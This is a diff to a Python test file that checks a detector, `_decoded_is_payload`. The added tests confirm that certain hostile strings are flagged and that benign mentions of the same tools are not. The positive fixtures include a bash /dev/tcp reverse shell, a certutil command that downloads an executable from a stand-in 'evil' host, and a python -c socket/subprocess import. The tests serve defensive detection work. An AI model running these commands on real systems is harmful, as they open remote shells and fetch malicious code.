@@ -57,6 +57,35 @@ def test_decoded_is_payload_real_commands_are_payloads():
         assert _decoded_is_payload(bad), bad
 
 
+def test_b121_additional_payload_signals_fail():
+    """B-121: reverse-shell / LOLBin / interpreter-exec payloads that carry no
+    curl/wget/nc/powershell token are still caught (self-sufficient STRONG signals)."""
+    for bad in (
+        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",            # /dev/tcp reverse shell
+        "certutil -urlcache -f http://evil/x.exe a.exe",    # certutil LOLBin download
+        'python3 -c "import socket,subprocess,os"',          # python -c with a dangerous import
+    ):
+        assert _decoded_is_payload(bad), bad
+
+
+def test_b121_benign_uses_of_new_tools_not_payloads():
+    """B-121 must not re-introduce the B-116 false CRITICAL FAIL: bare mentions AND common
+    benign invocations of these tools (python -m/-V, a plain python -c, ftp -passive, an
+    IPv6 config URL) stay PASS. The C-135 pass drove these — the broad python/scp/ftp/tftp
+    + flag matching and the bare IPv6-literal URL were dropped as false-FAIL prone."""
+    for benign in (
+        "The /dev/tcp technique is a known reverse-shell vector.",   # prose, no /dev/tcp/<x>
+        "run python -m pytest to test the module",                   # python -m — build doc
+        "python -V to check the interpreter version",                # python -V
+        'python3 -c "print(1 + 1)" prints the result',               # benign python -c (no danger)
+        "certutil can inspect certificates on Windows.",             # certutil, no -urlcache
+        "use ftp -passive mode for the transfer",                    # ftp + flag — dropped tier
+        "config endpoint: https://[2001:db8::1]/api",                # IPv6 URL in config — dropped
+        "columns: ftp_user, tftp_retries, python_version, notes",    # data-dictionary
+    ):
+        assert not _decoded_is_payload(benign), benign
+
+
 # --------------------------------------------------------------------- B13 end-to-end
 
 def test_b116_benign_decoded_csv_with_nc_column_not_fail():
